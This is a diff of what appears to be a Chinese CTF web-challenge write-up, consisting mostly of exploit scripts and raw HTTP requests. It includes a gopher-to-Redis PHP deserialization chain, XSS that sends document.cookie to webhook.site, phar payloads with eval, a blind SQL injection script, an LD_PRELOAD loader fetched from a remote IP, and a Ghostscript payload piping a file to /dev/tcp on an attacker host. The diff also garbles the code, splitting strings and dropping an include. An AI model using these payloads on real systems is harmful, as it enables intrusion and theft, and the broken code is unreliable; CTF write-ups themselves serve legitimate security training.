@@ -10,11 +10,13 @@ easy-swoole
 class Redis extends EasySwooleRedisRedis{
     public function __construct()
     {
-        parent::__construct(new EasySwooleRedisConfigRedisConfig([
+        parent::
+__construct(new EasySwooleRedisConfigRedisConfig([
             'host' => 'redis',
             'port' => '6379',
             'auth' => '123456',
-            'serialize' => EasySwooleRedisConfigRedisConfig::SERIALIZE_PHP
+            'serialize' => EasySwooleRedisConfigRedisConfig::
+SERIALIZE_PHP
         ]));
     }
 }
@@ -125,13 +127,16 @@ import requests
 import re
 
 if len(sys.argv) < 2:
-    print(sys.argv[0]+" target-ip:port")
+    print(sys.argv[0]+" target-ip:
+port")
     exit()
 
 url = "http://"+sys.argv[1]+"/crawler"
-data = "gopher://redis:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%246%0D%0A123456%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Ahttp%3A%2F%2Fexp%0D%0A%24652%0D%0AO%3A34%3A%22EasySwoole%5CHttp%5CMessage%5CUploadFile%22%3A1%3A%7Bs%3A6%3A%22stream%22%3BO%3A32%3A%22Prophecy%5CProphecy%5CObjectProphecy%22%3A2%3A%7Bs%3A10%3A%22lazyDouble%22%3BO%3A27%3A%22Prophecy%5CDoubler%5CLazyDouble%22%3A4%3A%7Bs%3A7%3A%22doubler%22%3BO%3A24%3A%22Prophecy%5CDoubler%5CDoubler%22%3A4%3A%7Bs%3A6%3A%22mirror%22%3BO%3A38%3A%22Prophecy%5CDoubler%5CGenerator%5CClassMirror%22%3A0%3A%7B%7Ds%3A7%3A%22creator%22%3BO%3A39%3A%22Prophecy%5CDoubler%5CGenerator%5CClassCreator%22%3A1%3A%7Bs%3A9%3A%22generator%22%3BO%3A38%3A%22PHPUnit%5CFramework%5CMockObject%5CMockTrait%22%3A2%3A%7Bs%3A9%3A%22classCode%22%3Bs%3A50%3A%22throw%20new%20ErrorException%28shell_exec%28%22%2Freadflag%22%29%29%3B%22%3Bs%3A8%3A%22mockName%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22namer%22%3BO%3A30%3A%22Prophecy%5CDoubler%5CNameGenerator%22%3A0%3A%7B%7Ds%3A7%3A%22patches%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22argument%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22class%22%3BN%3Bs%3A10%3A%22interfaces%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22revealer%22%3Br%3A2%3B%7D%7D%0D%0A"
+data = "gopher://redis:
+6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%246%0D%0A123456%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Ahttp%3A%2F%2Fexp%0D%0A%24652%0D%0AO%3A34%3A%22EasySwoole%5CHttp%5CMessage%5CUploadFile%22%3A1%3A%7Bs%3A6%3A%22stream%22%3BO%3A32%3A%22Prophecy%5CProphecy%5CObjectProphecy%22%3A2%3A%7Bs%3A10%3A%22lazyDouble%22%3BO%3A27%3A%22Prophecy%5CDoubler%5CLazyDouble%22%3A4%3A%7Bs%3A7%3A%22doubler%22%3BO%3A24%3A%22Prophecy%5CDoubler%5CDoubler%22%3A4%3A%7Bs%3A6%3A%22mirror%22%3BO%3A38%3A%22Prophecy%5CDoubler%5CGenerator%5CClassMirror%22%3A0%3A%7B%7Ds%3A7%3A%22creator%22%3BO%3A39%3A%22Prophecy%5CDoubler%5CGenerator%5CClassCreator%22%3A1%3A%7Bs%3A9%3A%22generator%22%3BO%3A38%3A%22PHPUnit%5CFramework%5CMockObject%5CMockTrait%22%3A2%3A%7Bs%3A9%3A%22classCode%22%3Bs%3A50%3A%22throw%20new%20ErrorException%28shell_exec%28%22%2Freadflag%22%29%29%3B%22%3Bs%3A8%3A%22mockName%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22namer%22%3BO%3A30%3A%22Prophecy%5CDoubler%5CNameGenerator%22%3A0%3A%7B%7Ds%3A7%3A%22patches%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22argument%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22class%22%3BN%3Bs%3A10%3A%22interfaces%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22revealer%22%3Br%3A2%3B%7D%7D%0D%0A"
 
-r = requests.get(url,params={"url":data})
+r = requests.get(url,params={"url":
+data})
 # print(r.text)
 r = requests.get(url,params={"url":"http://exp"})
 r = re.findall(r'(flag{[0-9a-f-]+})',r.text)
@@ -163,7 +168,7 @@ for i in range(0,10485760):
 
 输入验证码和payload如下
 
-__proto__[tagReplacementText]=<img src %3d1 onerror%3deval(data.passwd)>&name=<sss>&passwd=navigator.sendBeacon(`https://webhook.site/67012a5d-b312-4786-8c6c-cab47a7aa7ea`,document.cookie)
+__proto__[tagReplacementText]=&name=<sss>&passwd=navigator.sendBeacon(`https://webhook.site/67012a5d-b312-4786-8c6c-cab47a7aa7ea`,document.cookie)
 
 webhook拿flag就行了
 
@@ -195,16 +200,21 @@ $host='localhost'; //数据库主机名
 $dbName='test';    //使用的数据库
 $user='root';      //数据库连接用户名
 $pass='';          //对应的密码
-$dsn="uri:phar://phar.phar/$dbms:host=$host;dbname=$dbName";
+$dsn="uri:
+phar://phar.phar/$dbms:
+host=$host;dbname=$dbName";
 
 try {
     $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象
-    echo "连接成功<br/>";
+    echo "连接成功
+";
     $dbh = null;
 } catch (PDOException $e) {
-    die ("Error!: " . $e->getMessage() . "<br/>");
+    die ("Error!: " . $e->getMessage() . "
+");
 }
-$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));
+$db = new PDO($dsn, $user, $pass, array(PDO::
+ATTR_PERSISTENT => true));
 
 ?>
 
@@ -333,7 +343,8 @@ namespace {
 }
 
 GET /install.php?ip=127.0.0.1&content=s%3A461%3A%22%3C%3Fphp+eval%28%24_REQUEST%5B0%5D%29%3B__HALT_COMPILER%28%29%3B+%3F%3E%0D%0Az%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00D%01%00%00O%3A30%3A%22Nette%5CDatabase%5CTable%5CSelection%22%3A6%3A%7Bs%3A15%3A%22%00%2A%00observeCache%22%3Br%3A1%3Bs%3A13%3A%22%00%2A%00sqlBuilder%22%3BO%3A31%3A%22Nette%5CDatabase%5CTable%5CSqlBuilder%22%3A0%3A%7B%7Ds%3A18%3A%22%00%2A%00accessedColumns%22%3Bs%3A1%3A%221%22%3Bs%3A26%3A%22%00%2A%00previousAccessedColumns%22%3Bs%3A3%3A%22222%22%3Bs%3A18%3A%22%00%2A%00generalCacheKey%22%3Bs%3A17%3A%22%2Ftmp%2Finstall.lock%22%3Bs%3A8%3A%22%00%2A%00cache%22%3BO%3A35%3A%22Nette%5CDI%5CConfig%5CAdapters%5CPhpAdapter%22%3A0%3A%7B%7D%7D%08%00%00%00test.txt%03%00%00%00%8464b%03%00%00%00%D2cH%88%A4%01%00%00%00%00%00%00123%EF.c%C3%26%F0%F2%2F%84B%E6%0B%8E%8B%EC%09k3%E0%BB%02%00%00%00GBMB%22%3B&step=2&action=%E5%AE%89%E8%A3%85 HTTP/1.1
-Host: 127.0.0.1:888
+Host: 127.0.0.1:
+888
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -348,14 +359,17 @@ Sec-Fetch-User: ?1
 
 随后写入配置文件
 
-GET /install.php?type=uri:phar:///tmp/install.lock/mysql&ip=127.0.0.1&db=mysql&step=1&action=%E5%AE%89%E8%A3%85 HTTP/1.1
-Host: 127.0.0.1:888
+GET /install.php?type=uri:
+phar:///tmp/install.lock/mysql&ip=127.0.0.1&db=mysql&step=1&action=%E5%AE%89%E8%A3%85 HTTP/1.1
+Host: 127.0.0.1:
+888
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
-Referer: http://127.0.0.1:888/install.php
+Referer: http://127.0.0.1:
+888/install.php
 Cookie: _nss=1
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
@@ -372,7 +386,8 @@ sql注入，编写python代码：
 import xlwt
 import requests
 import time
-url="http://IP:PORT/index.php?id=1%27"
+url="http://IP:
+PORT/index.php?id=1%27"
 def write_execl(ord_id):
  wb = xlwt.Workbook();
  ws = wb.add_sheet("sheet1")
@@ -389,7 +404,8 @@ def sqli():
    sql_payload="123123' oorr case when(substr((selselectect group_concat(flag) from flag) from {} foorr 1 )='{}') then sleep(5) else 1 end -- a".format(i,s)
    print(sql_payload)
    write_execl(sql_payload)
-   file={'file':open('ok.xls','rb')}
+   file={'file':
+open('ok.xls','rb')}
    r=requests.post(url,files=file)
    if time.time()-startTime>4:
     print(s)
@@ -475,7 +491,7 @@ namespace{
 
 #define _GNU_SOURCE
 #include <stdlib.h>
-#include <unistd.h>
+#include 
 #include <sys/types.h>
 
 __attribute__ ((__constructor__)) void angel (void){
@@ -498,19 +514,22 @@ function go($func,$args){
   return pack("lllllla*a*", 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);
 }
 // $poc = <<< EOF
-// copy("http://20.1.1.189:999/1.so","/tmp/1");putenv("CMD=/readflag>/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");readfile('/tmp/flag');
+// copy("http://20.1.1.189:
+999/1.so","/tmp/1");putenv("CMD=/readflag>/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");readfile('/tmp/flag');
 // EOF;
 $poc = <<< EOF
 putenv("CMD=/readflag>/tmp/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");include('/tmp/flag');
 EOF;
 
-request_by_curl('http://127.0.0.1:888/index.php'.'?0='.$poc, go($_GET['cmd'],$_GET['args']));
+request_by_curl('http://127.0.0.1:
+888/index.php'.'?0='.$poc, go($_GET['cmd'],$_GET['args']));
 ?>
 
 发送数据包
 
 GET /poc.php?cmd=unserialize&args=O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D HTTP/1.1
-Host: 0.0.0.0:800
+Host: 0.0.0.0:
+800
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -599,19 +618,22 @@ https://github.com/ArtifexSoftware/ghostpdl/archive/refs/tags/ghostscript-9.50.z
 
 这种格式一看就是通过偏移取的值，所以rax就是整个字符串数组的指针，然后挨着遍历一下所有的字符串
 
-可以发现很多的路径里面都有*，所以我们可以通过其他的路径构造进行绕过copies (%pipe%%rom%lib/curl http://127.0.0.1:2333/) (r) file showpage 0 quit，发现可以成功打通
+可以发现很多的路径里面都有*，所以我们可以通过其他的路径构造进行绕过copies (%pipe%%rom%lib/curl http://127.0.0.1:
+2333/) (r) file showpage 0 quit，发现可以成功打通
 
 最终构造得到第二部分的poc：
 
 import requests
 
-url = "http://eci-???.cloudeci1.ichunqiu.com:8888/"
+url = "http://eci-???.cloudeci1.ichunqiu.com:
+8888/"
 convert_url = "/convert"
 hack_ip = "vps_ip"
 res = requests.session()
 
-get_flag2=f"""<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/temp/;bash -c 'cat /flag2 > /dev/tcp/{hack_ip}/2333') (r) file showpage 0 quit </desc> <image href="epi:/proc/self/fd/4" /> <svg width="1px" height="1px" /> </hui>"""
-res.post(url+"/upload",files={"file":get_flag2})
+get_flag2=f"""<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/temp/;bash -c 'cat /flag2 > /dev/tcp/{hack_ip}/2333') (r) file showpage 0 quit </desc>  <svg width="1px" height="1px" /> </hui>"""
+res.post(url+"/upload",files={"file":
+get_flag2})
 res.get(url+convert_url)
 
 晋升之路
@@ -639,30 +661,29 @@ https://www.ichunqiu.com/competition
 
 欢迎找到春秋GAME投稿哦～
 
-联系vx:cium0309
+联系vx:
+cium0309
 
 欢迎加入 春秋GAME CTF交流2群
 
-Q群:703460426
+Q群:
+703460426
 
 
 ```
 class Redis extends EasySwooleRedisRedis{
     public function __construct()
     {
-        parent::__construct(new EasySwooleRedisConfigRedisConfig([
+        parent::
+__construct(new EasySwooleRedisConfigRedisConfig([
             'host' => 'redis',
             'port' => '6379',
             'auth' => '123456',
-            'serialize' => EasySwooleRedisConfigRedisConfig::SERIALIZE_PHP
+            'serialize' => EasySwooleRedisConfigRedisConfig::
+SERIALIZE_PHP
         ]));
     }
 }
-```
-
-
-
-```
 private static function make_request($url)
 {
     $ch = curl_init();
@@ -674,11 +695,6 @@ private static function make_request($url)
     curl_close($ch);
     return $output;
 }
-```
-
-
-
-```
 <?php
 
 namespace EasySwooleHttpMessage{
@@ -759,38 +775,26 @@ namespace {
     $message = new EasySwooleHttpMessageUploadFile($objectProphecy);
     echo base64_encode(serialize($message));
 }
-```
-
-
-
-```
 import sys
 import requests
 import re
 
 if len(sys.argv) < 2:
-    print(sys.argv[0]+" target-ip:port")
+    print(sys.argv[0]+" target-ip:
+port")
     exit()
 
 url = "http://"+sys.argv[1]+"/crawler"
-data = "gopher://redis:6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%246%0D%0A123456%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Ahttp%3A%2F%2Fexp%0D%0A%24652%0D%0AO%3A34%3A%22EasySwoole%5CHttp%5CMessage%5CUploadFile%22%3A1%3A%7Bs%3A6%3A%22stream%22%3BO%3A32%3A%22Prophecy%5CProphecy%5CObjectProphecy%22%3A2%3A%7Bs%3A10%3A%22lazyDouble%22%3BO%3A27%3A%22Prophecy%5CDoubler%5CLazyDouble%22%3A4%3A%7Bs%3A7%3A%22doubler%22%3BO%3A24%3A%22Prophecy%5CDoubler%5CDoubler%22%3A4%3A%7Bs%3A6%3A%22mirror%22%3BO%3A38%3A%22Prophecy%5CDoubler%5CGenerator%5CClassMirror%22%3A0%3A%7B%7Ds%3A7%3A%22creator%22%3BO%3A39%3A%22Prophecy%5CDoubler%5CGenerator%5CClassCreator%22%3A1%3A%7Bs%3A9%3A%22generator%22%3BO%3A38%3A%22PHPUnit%5CFramework%5CMockObject%5CMockTrait%22%3A2%3A%7Bs%3A9%3A%22classCode%22%3Bs%3A50%3A%22throw%20new%20ErrorException%28shell_exec%28%22%2Freadflag%22%29%29%3B%22%3Bs%3A8%3A%22mockName%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22namer%22%3BO%3A30%3A%22Prophecy%5CDoubler%5CNameGenerator%22%3A0%3A%7B%7Ds%3A7%3A%22patches%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22argument%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22class%22%3BN%3Bs%3A10%3A%22interfaces%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22revealer%22%3Br%3A2%3B%7D%7D%0D%0A"
+data = "gopher://redis:
+6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%246%0D%0A123456%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Ahttp%3A%2F%2Fexp%0D%0A%24652%0D%0AO%3A34%3A%22EasySwoole%5CHttp%5CMessage%5CUploadFile%22%3A1%3A%7Bs%3A6%3A%22stream%22%3BO%3A32%3A%22Prophecy%5CProphecy%5CObjectProphecy%22%3A2%3A%7Bs%3A10%3A%22lazyDouble%22%3BO%3A27%3A%22Prophecy%5CDoubler%5CLazyDouble%22%3A4%3A%7Bs%3A7%3A%22doubler%22%3BO%3A24%3A%22Prophecy%5CDoubler%5CDoubler%22%3A4%3A%7Bs%3A6%3A%22mirror%22%3BO%3A38%3A%22Prophecy%5CDoubler%5CGenerator%5CClassMirror%22%3A0%3A%7B%7Ds%3A7%3A%22creator%22%3BO%3A39%3A%22Prophecy%5CDoubler%5CGenerator%5CClassCreator%22%3A1%3A%7Bs%3A9%3A%22generator%22%3BO%3A38%3A%22PHPUnit%5CFramework%5CMockObject%5CMockTrait%22%3A2%3A%7Bs%3A9%3A%22classCode%22%3Bs%3A50%3A%22throw%20new%20ErrorException%28shell_exec%28%22%2Freadflag%22%29%29%3B%22%3Bs%3A8%3A%22mockName%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22namer%22%3BO%3A30%3A%22Prophecy%5CDoubler%5CNameGenerator%22%3A0%3A%7B%7Ds%3A7%3A%22patches%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22argument%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22class%22%3BN%3Bs%3A10%3A%22interfaces%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22revealer%22%3Br%3A2%3B%7D%7D%0D%0A"
 
-r = requests.get(url,params={"url":data})
+r = requests.get(url,params={"url":
+data})
 # print(r.text)
 r = requests.get(url,params={"url":"http://exp"})
 r = re.findall(r'(flag{[0-9a-f-]+})',r.text)
 print(r[0])
-```
-
-
-
-```
 curl http://127.0.0.1/user/change -H "Content-Type: application/json" -H "Cookie: ctf=这里是你自己的值" -d '{"bio":"sss","username":"admin","op":"UPP.save"}'
-```
-
-
-
-```
 import hashlib
 
 for i in range(0,10485760):
@@ -802,17 +806,7 @@ for i in range(0,10485760):
  if md[0:6] == '7c0d5f':
    print(i)
    break
-```
-
-
-
-```
-__proto__[tagReplacementText]=<img src %3d1 onerror%3deval(data.passwd)>&name=<sss>&passwd=navigator.sendBeacon(`https://webhook.site/67012a5d-b312-4786-8c6c-cab47a7aa7ea`,document.cookie)
-```
-
-
-
-```
+__proto__[tagReplacementText]=&name=<sss>&passwd=navigator.sendBeacon(`https://webhook.site/67012a5d-b312-4786-8c6c-cab47a7aa7ea`,document.cookie)
 <?php
 include_once "classTest.php";
 
@@ -821,23 +815,23 @@ $host='localhost'; //数据库主机名
 $dbName='test';    //使用的数据库
 $user='root';      //数据库连接用户名
 $pass='';          //对应的密码
-$dsn="uri:phar://phar.phar/$dbms:host=$host;dbname=$dbName";
+$dsn="uri:
+phar://phar.phar/$dbms:
+host=$host;dbname=$dbName";
 
 try {
     $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象
-    echo "连接成功<br/>";
+    echo "连接成功
+";
     $dbh = null;
 } catch (PDOException $e) {
-    die ("Error!: " . $e->getMessage() . "<br/>");
+    die ("Error!: " . $e->getMessage() . "
+");
 }
-$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));
+$db = new PDO($dsn, $user, $pass, array(PDO::
+ATTR_PERSISTENT => true));
 
 ?>
-```
-
-
-
-```
 <?php
 
 namespace NetteDIConfigAdapters{
@@ -887,11 +881,6 @@ namespace {
     //签名自动计算
     $phar->stopBuffering();
 }
-```
-
-
-
-```
 <?php
 
 namespace NetteDIConfigAdapters{
@@ -943,13 +932,9 @@ namespace {
     echo urlencode(serialize(file_get_contents("phar.phar")));
 
 }
-```
-
-
-
-```
 GET /install.php?ip=127.0.0.1&content=s%3A461%3A%22%3C%3Fphp+eval%28%24_REQUEST%5B0%5D%29%3B__HALT_COMPILER%28%29%3B+%3F%3E%0D%0Az%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00D%01%00%00O%3A30%3A%22Nette%5CDatabase%5CTable%5CSelection%22%3A6%3A%7Bs%3A15%3A%22%00%2A%00observeCache%22%3Br%3A1%3Bs%3A13%3A%22%00%2A%00sqlBuilder%22%3BO%3A31%3A%22Nette%5CDatabase%5CTable%5CSqlBuilder%22%3A0%3A%7B%7Ds%3A18%3A%22%00%2A%00accessedColumns%22%3Bs%3A1%3A%221%22%3Bs%3A26%3A%22%00%2A%00previousAccessedColumns%22%3Bs%3A3%3A%22222%22%3Bs%3A18%3A%22%00%2A%00generalCacheKey%22%3Bs%3A17%3A%22%2Ftmp%2Finstall.lock%22%3Bs%3A8%3A%22%00%2A%00cache%22%3BO%3A35%3A%22Nette%5CDI%5CConfig%5CAdapters%5CPhpAdapter%22%3A0%3A%7B%7D%7D%08%00%00%00test.txt%03%00%00%00%8464b%03%00%00%00%D2cH%88%A4%01%00%00%00%00%00%00123%EF.c%C3%26%F0%F2%2F%84B%E6%0B%8E%8B%EC%09k3%E0%BB%02%00%00%00GBMB%22%3B&step=2&action=%E5%AE%89%E8%A3%85 HTTP/1.1
-Host: 127.0.0.1:888
+Host: 127.0.0.1:
+888
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -961,34 +946,28 @@ Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
 Sec-Fetch-Site: none
 Sec-Fetch-User: ?1
-```
-
-
-
-```
-GET /install.php?type=uri:phar:///tmp/install.lock/mysql&ip=127.0.0.1&db=mysql&step=1&action=%E5%AE%89%E8%A3%85 HTTP/1.1
-Host: 127.0.0.1:888
+GET /install.php?type=uri:
+phar:///tmp/install.lock/mysql&ip=127.0.0.1&db=mysql&step=1&action=%E5%AE%89%E8%A3%85 HTTP/1.1
+Host: 127.0.0.1:
+888
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
-Referer: http://127.0.0.1:888/install.php
+Referer: http://127.0.0.1:
+888/install.php
 Cookie: _nss=1
 Upgrade-Insecure-Requests: 1
 Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
 Sec-Fetch-Site: same-origin
 Sec-Fetch-User: ?1
-```
-
-
-
-```
 import xlwt
 import requests
 import time
-url="http://IP:PORT/index.php?id=1%27"
+url="http://IP:
+PORT/index.php?id=1%27"
 def write_execl(ord_id):
  wb = xlwt.Workbook();
  ws = wb.add_sheet("sheet1")
@@ -1005,7 +984,8 @@ def sqli():
    sql_payload="123123' oorr case when(substr((selselectect group_concat(flag) from flag) from {} foorr 1 )='{}') then sleep(5) else 1 end -- a".format(i,s)
    print(sql_payload)
    write_execl(sql_payload)
-   file={'file':open('ok.xls','rb')}
+   file={'file':
+open('ok.xls','rb')}
    r=requests.post(url,files=file)
    if time.time()-startTime>4:
     print(s)
@@ -1013,11 +993,6 @@ def sqli():
     break
  print(flag)
 sqli()
-```
-
-
-
-```
 <?php
 function request_by_curl($remote_server, $post_string) {
   $ch = curl_init();
@@ -1035,11 +1010,6 @@ request_by_curl('http://127.0.0.1/index.php', go($_GET['cmd'],$_GET['args']));
 ?>
 
 # http://127.0.0.1/poc.php?cmd=phpinfo&args=-1
-```
-
-
-
-```
 <?php
 namespace Ctf{
     class Treeting{
@@ -1064,26 +1034,16 @@ namespace{
     // unserialize($poc);
 }
 # O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D
-```
-
-
-
-```
-#define _GNU_SOURCE
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/types.h>
+    #define _GNU_SOURCE
+    #include <stdlib.h>
+    #include 
+    #include <sys/types.h>
 
 __attribute__ ((__constructor__)) void angel (void){
     unsetenv("LD_PRELOAD");
  const char* cmdline = getenv("CMD");
  system(cmdline);
 }
-```
-
-
-
-```
 <?php
 function request_by_curl($remote_server, $post_string) {
   $ch = curl_init();
@@ -1098,21 +1058,19 @@ function go($func,$args){
   return pack("lllllla*a*", 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);
 }
 // $poc = <<< EOF
-// copy("http://20.1.1.189:999/1.so","/tmp/1");putenv("CMD=/readflag>/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");readfile('/tmp/flag');
+// copy("http://20.1.1.189:
+999/1.so","/tmp/1");putenv("CMD=/readflag>/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");readfile('/tmp/flag');
 // EOF;
 $poc = <<< EOF
 putenv("CMD=/readflag>/tmp/flag");putenv("LD_PRELOAD=/tmp/1");mail("","","","","");include('/tmp/flag');
 EOF;
 
-request_by_curl('http://127.0.0.1:888/index.php'.'?0='.$poc, go($_GET['cmd'],$_GET['args']));
+request_by_curl('http://127.0.0.1:
+888/index.php'.'?0='.$poc, go($_GET['cmd'],$_GET['args']));
 ?>
-```
-
-
-
-```
 GET /poc.php?cmd=unserialize&args=O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D HTTP/1.1
-Host: 0.0.0.0:800
+Host: 0.0.0.0:
+800
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -1122,11 +1080,6 @@ Cookie: tracy-session=436e349820; _nss=1; PHPSESSID=3jn67ujcvbcurso8cli2grh670
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
-```
-
-
-
-```
 #!/usr/bin/perl
 use strict;
 use warnings;
@@ -1174,26 +1127,18 @@ main();
 __DATA__
 (xmp"
 ".`/bin/bash -c '##'`;#"
-```
-
-
-
-```
 import requests
 
-url = "http://eci-???.cloudeci1.ichunqiu.com:8888/"
+url = "http://eci-???.cloudeci1.ichunqiu.com:
+8888/"
 convert_url = "/convert"
 hack_ip = "vps_ip"
 res = requests.session()
 
-get_flag2=f"""<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/temp/;bash -c 'cat /flag2 > /dev/tcp/{hack_ip}/2333') (r) file showpage 0 quit </desc> <image href="epi:/proc/self/fd/4" /> <svg width="1px" height="1px" /> </hui>"""
-res.post(url+"/upload",files={"file":get_flag2})
+get_flag2=f"""<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <hui><desc>copies (%pipe%/temp/;bash -c 'cat /flag2 > /dev/tcp/{hack_ip}/2333') (r) file showpage 0 quit </desc>  <svg width="1px" height="1px" /> </hui>"""
+res.post(url+"/upload",files={"file":
+get_flag2})
 res.get(url+convert_url)
-```
-
-
-
-```
 // 历史最高分
 const BestScoreKey = 'BestScore';
 // 方格状态和分数
@@ -1242,11 +1187,6 @@ Storage.prototype.getCellState = function() {
   const cellState = getData(CellStateKey);
   return cellState ? JSON.parse(cellState) : null;
 };
-```
-
-
-
-```
 import requests
 import time
 import json
